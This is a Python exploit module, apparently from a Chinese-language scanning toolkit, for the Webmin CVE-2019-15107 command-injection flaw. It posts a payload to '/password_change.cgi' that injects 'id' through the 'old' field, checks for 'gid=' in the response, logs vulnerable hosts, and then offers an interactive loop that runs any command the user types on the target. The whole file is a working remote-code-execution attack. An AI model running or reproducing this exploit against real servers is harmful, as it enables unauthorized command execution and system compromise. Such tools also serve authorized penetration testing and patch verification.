#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
import requests
class Cve_2019_15107:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/password_change.cgi'
        header = {
            "Host": url.split("://")[-1],
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "User-Agent": self.header,
            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1",
            "Referer": url + "/session_login.cgi",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"
        try:
            req = requests.post(url2, timeout=3,data=data,verify=self.verify,proxies=self.proxy,headers=header)
            if "gid=" in req.text:
                OutPrintInfoSuc("Webmin", f"存在Webmin-Rce漏洞 {url2}")

                if self.batch:
                    with open("./result/webmin_2019_15107.txt","a") as w:
                        w.write(f"{url2}\n")
            return True
        except Exception:
            if not self.batch:
                OutPrintInfo("Webmin", "不存在Webmin CVE-2019-15107-Rce")
            return False
    def send_payload2(self,url,cmd):
        url2 = url + '/password_change.cgi'
        header = {
            "Host": url.split("://")[-1],
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "User-Agent": self.header,
            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1",
            "Referer": url + "/session_login.cgi",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = f"user=rootxx&pam=&expired=2&old=test|{cmd}&new1=test2&new2=test2"
        try:
            req = requests.post(url2, timeout=3,data=data,verify=self.verify,proxies=self.proxy,headers=header)
            OutPrintInfo("Webmin", f"响应如下: \n{req.text.strip()}")

            return True
        except:
            OutPrintInfo("Webmin", "不存在Webmin CVE-2019-15107-Rce")
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Webmin", "开始检测Webmin CVE-2019-15107-Rce...")
        if self.send_payload(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b yellow]输入需要执行的命令")
                        if cmd == "exit":
                            break
                        self.send_payload2(url,cmd)
                        OutPrintInfo("WordPress", f"[b bright_red]执行完成")


            else:
                return
        if not self.batch:
            OutPrintInfo("Webmin", "Webmin CVE-2019-15107-Rce检测结束")